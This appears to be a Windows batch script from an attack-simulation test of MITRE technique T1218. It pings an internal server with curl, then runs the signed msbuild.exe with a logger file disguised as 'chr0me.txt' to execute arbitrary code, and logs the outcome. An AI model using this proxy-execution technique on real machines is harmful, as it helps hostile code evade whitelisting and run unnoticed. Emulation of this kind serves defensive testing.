@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET pjkcpgw=%APPDATA%\9428\f680853c
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?9428-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=chr0me.txt
SET ewjmdkff=9428
SET apbaj=%APPDATA%\%pudaazx%\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_start>> "!apbaj!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_complete>> "!apbaj!" 2>nul

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: msbuild_start>> "!apbaj!" 2>nul
SET clgkw=1
SET dqntwfg=
%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe /logger:LoggerEntry,"!pjkcpgw!\!syjfr!";MyParameters,Foo
IF NOT !errorlevel! EQU 0 (
 SET clgkw=0
 SET dqntwfg=exec_failed
)
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: msbuild_complete>> "!apbaj!" 2>nul
echo [!DATE:~-4!-!DATE:~4,2!-!DATE:~7,2! !TIME!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218|Signed Binary Proxy Execution: MSBuild=!clgkw!:!dqntwfg!>> "!apbaj!" 2>nul